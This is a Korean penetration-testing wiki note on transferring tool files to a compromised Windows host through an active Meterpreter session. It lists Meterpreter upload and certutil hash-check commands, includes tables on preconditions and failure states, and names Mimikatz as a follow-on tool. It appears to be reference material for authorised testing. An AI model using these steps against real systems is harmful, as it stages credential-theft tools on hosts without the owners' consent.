---
tags:
  - 환경/windows
시작조건: ["Windows Meterpreter 세션 확보"]
필요권한: ["대상 저장 경로 쓰기 권한"]
필요조건: ["공격 호스트의 원본 파일", "활성 Meterpreter 세션", "대상 저장 경로"]
결과: ["Windows 대상의 도구 파일"]
---

# Meterpreter upload로 Windows 파일 반입

## 한 줄 판단

Windows 대상의 활성 Meterpreter 세션과 대상 경로 쓰기 권한이 있다면, 공격 호스트의 파일을 `upload`로 반입하고 대상에서 크기와 SHA-256을 확인한다.

## 사용할 때

- 이미 Meterpreter 세션이 있어 별도 HTTP·SMB listener 없이 파일을 반입할 때.
- Mimikatz 같은 후속 도구를 대상의 쓰기 가능한 경로에 둘 때.
- 업로드 성공 메시지와 대상 파일 실행 성공을 분리해 확인할 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| Meterpreter 세션 | 대상 Windows 호스트의 활성 세션 | `getuid`, `sysinfo`, `pwd` | 세션 timeout·대상 호스트·arch 확인 |
| 원본 파일 | 공격 호스트에서 읽을 수 있는 파일 | `sha256sum <LOCAL_FILE>` | 로컬 경로와 파일 무결성 확인 |
| 대상 경로 | 현재 세션이 쓸 수 있는 디렉터리 | `ls`, `pwd` 또는 OS 셸의 ACL 확인 | 사용자 Temp 등 다른 경로 선택 |

## 실행

```text
meterpreter > getuid
meterpreter > sysinfo
meterpreter > upload <LOCAL_FILE> C:\Windows\Temp\<REMOTE_FILE>
meterpreter > ls C:\Windows\Temp\<REMOTE_FILE>
meterpreter > shell
C:\> certutil.exe -hashfile C:\Windows\Temp\<REMOTE_FILE> SHA256
```

확인할 출력:

- `uploaded ... to ...`와 원격 파일 경로가 표시된다.
- `ls`에서 파일 크기, 대상 OS 셸에서 SHA-256을 확인한다.
- 세션 timeout이면 파일 권한보다 세션 생존과 channel 상태를 먼저 확인한다.
- 업로드는 성공했지만 실행이 거부되면 arch·ACL·AppLocker·AV 차단을 별도로 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 업로드 메시지, 원격 파일과 SHA-256 일치 | Meterpreter 경유 파일 반입 성공 | Windows 대상의 검증된 도구 파일 | 파일을 사용할 공격기법으로 돌아가 실행 |
| 원격 경로 access denied | 현재 세션이 경로에 쓸 수 없음 | 시작 상태 유지 | 사용자 Temp·현재 디렉터리 ACL 확인 |
| 세션 timeout·channel 종료 | 전송 전에 Meterpreter 세션 불안정 | 파일 반입 미확정 | [[Meterpreter 프로세스 이동과 세션 안정화]] 후 재확인 |
| 파일은 존재하지만 hash 불일치 | 전송 중단·다른 파일 덮어쓰기 | 손상 파일 | 실행하지 말고 원본·대상 경로 확인 후 재전송 |

## 확인할 출력과 권한

- `upload` 성공, 원격 파일 존재와 SHA-256 일치를 각각 확인한다.
- 파일 반입은 도구 실행 권한이나 자격 증명 추출 성공을 의미하지 않는다.

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 대상 저장 파일 | 디스크에 도구 파일이 남음 | 원격 경로·크기·hash 확인 | 사용 완료 후 `rm C:\Windows\Temp\<REMOTE_FILE>` 또는 OS 셸에서 `del` |

## 관련 도구

- [[meterpreter]]

## 관련 상태 라우터

- [[Meterpreter 세션 후속 행동]]
- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
